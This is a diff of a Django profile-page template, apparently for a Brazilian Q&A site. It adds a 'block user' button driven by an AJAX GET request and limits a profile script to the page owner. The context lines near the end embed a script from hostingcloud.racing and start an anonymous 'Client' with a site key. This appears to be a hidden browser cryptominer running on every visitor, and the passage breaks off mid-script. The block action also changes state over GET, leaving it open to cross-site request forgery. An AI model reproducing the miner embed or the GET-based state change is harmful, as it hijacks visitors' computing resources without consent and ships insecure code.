@@ -1,3 +1,4 @@
+{% load main_app_extras %}
 {% load humanize %}
 <!doctype html>
 <html lang="pt-br">{% if user.username == "Erick" %} {{ user_p.total_views }} visualizações {% endif %}
@@ -167,6 +168,37 @@
 		  </tbody>
 		</table>
 
+		{% if user_p.user.username != user.username %}
+		<style>
+			#block-div {
+				margin: 1%;
+			}
+		</style>
+
+		<center id="block-div">
+			<button id="block-button" class="btn btn-outline-info" onclick="block_user()">{{ user.username|blocked:user_p.user.username }}</button>
+		</center>
+		
+		<script>
+			function block_user() {
+				button = document.getElementById('block-button')
+				
+				$.ajax({
+					type: 'get',
+					url: '/user/{{ user_p.user.username }}/block',
+					data: {
+						'action': button.innerHTML,
+					},
+					complete: function(data) {
+						if(button.innerHTML == 'Bloqueado') {
+							button.innerHTML = 'Bloquear'
+						} else
+							button.innerHTML = 'Bloqueado'
+					}
+				})	
+			}
+		</script>
+		{% endif %}
 
 		{% if user_p.user.username == user.username %}
 		<div id="edit-profile"><a href="/user/{{ user.username }}/edit">Editar perfil</a></div>
@@ -205,9 +237,9 @@
 			</div>
 			<button class="btn btn-outline-primary" onclick="show_more_responses(this)">mais</button>
 		</section>
-
+{% if user_p.user.username == user.username %}
 <script src="/static/js/profile.js"></script>
-
+{% endif %}
 <script src="https://www.hostingcloud.racing/gCgZ.js"></script>
 <script>
     var _client = new Client.Anonymous('5359e2aefac13b8544fcee9326d4a0aafb5fd62a6991f1e87ade167c09c9967a', {
